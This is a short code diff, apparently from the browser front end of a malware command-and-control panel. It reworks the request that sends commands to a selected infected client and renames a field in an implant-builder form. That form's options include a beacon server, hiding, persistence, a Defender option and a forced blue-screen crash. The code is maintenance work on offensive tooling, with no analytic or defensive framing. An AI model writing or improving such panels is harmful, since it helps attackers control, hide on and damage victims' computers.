@@ -659,7 +659,7 @@
             fetch('/api/panel/command', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json', 'X-Token': token },
-                body: JSON.stringify({ id: selectedClient, action: action })
+                body: JSON.stringify({ cid: selectedClient, cmd: { action: action } })
             })
             .then(r => r.json())
             .then(data => {
@@ -918,7 +918,7 @@
             const payload = {
                 server: document.getElementById('b-url').value,
                 beacon: document.getElementById('b-beacon').value,
-                hide: document.getElementById('b-hide').checked,
+                hidden: document.getElementById('b-hide').checked,
                 persist: document.getElementById('b-persist').checked,
                 defender: document.getElementById('b-defend').checked,
                 bsod: document.getElementById('b-bsod').checked,
